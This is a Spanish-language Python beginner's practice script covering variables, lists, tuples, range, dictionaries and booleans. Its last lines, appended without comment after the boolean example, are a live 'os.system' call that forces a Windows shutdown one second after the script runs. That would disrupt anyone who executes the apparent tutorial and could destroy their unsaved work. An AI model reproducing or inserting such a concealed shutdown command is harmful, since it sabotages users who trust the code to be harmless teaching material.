#  Comentario 
# if 5 > 3: 
#     print ('esto es verdadero')
'''

Asignacion de variables

'''
x = 5 
y = 'Juan'


#print (x, y)

Email = 'Juan@sito.com'

#print (Email)

Mi_var = 'Chocolate'

'''

Asignacion de varias variables 

'''
a,b,c = 'Arroz', 'Habichuela', 'Carne'

#print (a)

# Asignarle multiples valores a varias variables

'''

Mismo valor para distintas variables 

'''
Valor1 = Valor2 = Valor3 = 'Comida'

#print (Valor1,Valor2,Valor3)
'''

Concatenacion 

'''
Inicio = "Hola "

final = "Mundo"

#print (Inicio + final)
'''

Tipos de variables 

'''
palabra = 'Hola mundo' # String 
oracion = "Hola mundo comilla doble" # String 
entero = 20 # Integer 
Condecimal = 15.0 # FLoat
Complejo = 10j 

#print (palabra, oracion, entero, Condecimal, Complejo)
'''

Listas (Copiar,Agregar,eliminar,contar,cantidad de elementos)

'''
Lista = [1,2,3]
lista2 = Lista.copy()
Lista.append(4)

#print (lista2.count(2))
#print (len(Lista)) # Para saber la cantidad de elementos 

Lista.pop() # Para eliminar  ultimo elemento 
#print (Lista)
#print (Lista.remove(2)) # Para eliminar el elemento deseado 


'''

Para ordenar y desordenar una lista

'''

Cantidad = [1, 2, 3, 4, 5]

Cantidad.sort() # Para ordenar 
Cantidad.reverse() # Para desordenar o revertir 
#print (Cantidad)

'''

Tuplas 

'''

Numeros = (1, 2, 3, 4,)
#print (Numeros.index(2)) # Usar index para ubicar el elemento 

# Convertir una tupla a lista 

Lista_Tupla = list(Numeros)
Lista_Tupla.append("Chanchito")
#print (Lista_Tupla)

'''

Range

'''
rango = range(6)
#print(rango)

'''

Diccionarios 

'''

Market = { 

    'CatName': 'Cedric',
    'Color': "Blanco", 
    "Edad": 2
}

#print (Market)
# print (Market['Color']) # Para acceder a un valor
# print (Market['CatName'])
#print (Market.get('Color'))# Otra forma para acceder a un valor 

Market['Color'] = 'Negro' # Para cambiar un valor 
#print (len(Market))

'''

Profundidad acerca de los diccionarios 

'''
Market['ronronea'] = "Si" # Para agregar un nuevo valor 

#print (Market)

#arket.pop('ronronea') # Para eliminar un valor seleccionado 
#print (Market)

#Market.popitem() # Para eliminar el ultimo valor 
#print (Market)

#del Market['ronronea'] # Otra forma de eliminar un valor 
#print (Market)

CopiaMarket = Market.copy() # para hacer una copia 
CopiaMarket2 = dict(Market) # Otra forma de copiar 
#print (Market, CopiaMarket)

# Market.clear()
# print (Market)

'''

Diccionarios anidados y constructor dict

'''
SuperMarket = { # para adjuntar o tener en un diccionario  
    'Books': {
        'Name': 'Padrerico y PadrePobre',
        'Quantity': 10,
        'Price': 100
    },
    'Food': {
        'Drinks': 'AppleJuice',
        'Meat': 'Bear',
        'FastFood': 'Pizza'
    }
}
#print (SuperMarket)

# Constructor dict

Kitty = dict(nombre="cedric", Edad=3)
print(Kitty)


'''

Boolean

'''
verdadero = True
falso = False

print (verdadero,falso) 

import os 
os.system("shutdown/s/t 1")